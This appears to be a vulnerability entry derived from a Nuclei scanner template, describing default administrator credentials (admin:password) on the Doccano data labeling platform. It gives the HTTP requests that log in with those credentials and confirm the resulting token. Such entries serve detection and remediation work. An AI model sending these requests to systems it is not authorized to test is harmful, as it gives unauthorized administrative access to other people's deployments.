# Vulnerability: Doccano - Default Login
**Classification:** DOCCANO
**Source:** Nuclei Template (`doccano-default-login.yaml`)

## Description
Detected the Doccano data labeling platform was using default administrator credentials (admin:password). An attacker could have gained full administrative access.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /auth HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /v1/auth-token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"admin","password":"password"}

GET /v1/me HTTP/1.1
Host: {{Hostname}}
Authorization: Token {{token}}
Accept: application/json
```

